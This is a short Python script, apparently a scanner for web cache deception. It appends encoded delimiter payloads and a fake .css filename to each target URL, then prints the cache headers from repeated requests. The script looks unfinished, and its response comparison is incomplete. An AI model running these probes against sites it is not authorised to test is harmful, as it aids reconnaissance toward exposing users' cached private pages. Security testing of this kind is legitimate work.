import requests 
from urllib.request import urlopen
from pprint import pprint
from time import sleep

LOGS = "logs.txt"
URLS = "urls.txt"

lst = []

with open (URLS, "r+") as f:
  lst = f.readlines()

lst = [l.strip() for l in lst]

# shit.com/shit.css # access 1x --> cache hit # access 2x --> cache miss --> vuln
# shit.com%0Ashit.css
attack_lst = [
  r"/",
  r"%0A",
  r"%3Fname=",
  r"%3B",
  r"%23",
  r"%2F",
  r"%25%30%41",
  r"%25%30%30",
  r"%25%33%46",
  r"%25%33%42",
  r"%25%32%33",
  r"%25%32%46",
  r"%40",
  r"%25%34%30",
  r"%5C",
  r"%25%35%43",
  r"%3A",
  r"%25%33%41",
  r"@"
]

cache_status = [
  "server-timing", "X-Cache", "X-Cache-Remote",
  "cf-cache-status",
  "cdn_cache_status",
  "x-cache",
  "X-Proxy-Cache",
  "X-Rack-Cache",
  "x-cache-info"
]

attack_string = "teamchae.css"

## Get stuff
for url_ in lst:
  ## Add http://, may not be necessary.
  url_ = "http://" + url_
  print(" ====== [i] testing for", url_, "======")
  r1 = requests.get(url_)
  r2 = requests.get(url_)

  if r1.content == r2.content:
    print("[!] static page detected, abort test!")
  else:
    ## step 2
    ## add attack url
    print("[!] step 1 passed (dynamic page), moving on to step 2...")
    for suffix in attack_lst:
      print("---------------------------------")
      sleep(0.3)
      # make attack url
      attack_url = url_ + suffix + attack_string
      
      failed = False

      ## Use requests
      try:
        print("[i] trying", attack_url)
        ar1 = requests.get(attack_url)
        ar2 = requests.get(attack_url)

        h1 = ar1.headers
        # print(type(h1))
        h2 = ar2.headers
      except Exception as e:
        print("[!] error:", e)
        failed = True

      if failed == False:
        ## get cache status
        for status in cache_status:
          print("[i] trying " + status)
          print(h1.get(status))
      ## Use urlopen
      # try:
      #   with urlopen(attack_url) as resp1:
      #     print("[1] attack url passed:", attack_url)
      #     pass
      #   with urlopen(attack_url) as resp2:
      #     print("[2] attack url passed:", attack_url)
      #     pass
      # except Exception as e:
      #   print("[!] error: 404!")
      #   failed = True

      # if failed == False:
      #   h1 = resp1.headers.items()
      #   h2 = resp2.headers.items()

      #   print(h1)

